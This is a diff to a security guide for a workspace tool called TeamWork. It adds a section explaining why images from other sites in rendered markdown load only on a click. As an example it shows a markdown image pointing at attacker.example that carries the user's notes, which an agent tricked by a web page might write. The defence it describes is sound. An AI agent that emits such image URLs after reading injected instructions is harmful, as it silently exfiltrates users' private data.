@@ -83,3 +83,16 @@ it. Don't open TeamWork itself to the internet for that.
    [network-exposure guide](https://github.com/praxagent/prax/blob/main/docs/security/network-exposure.md).)
 3. You would be comfortable with the workspace contents leaking if the key did.
    If not, use `tailscale serve` instead.
+
+## Images from other sites load on a click
+
+Messages and notes are rendered markdown, often written by an agent that has
+just read a web page. An image in markdown is a URL that the browser fetches as
+soon as the message appears, and a URL can carry data. An agent tricked by a
+page into writing `![chart](https://attacker.example/p.png?d=<your notes>)`
+would send your notes to that site without anyone clicking anything.
+
+So images from other sites show as a "click to load" button with the site's
+name; images TeamWork itself serves (uploads, generated files) show directly.
+When loaded, they are fetched with no referrer. Plain links are unaffected:
+they open only when you click them.
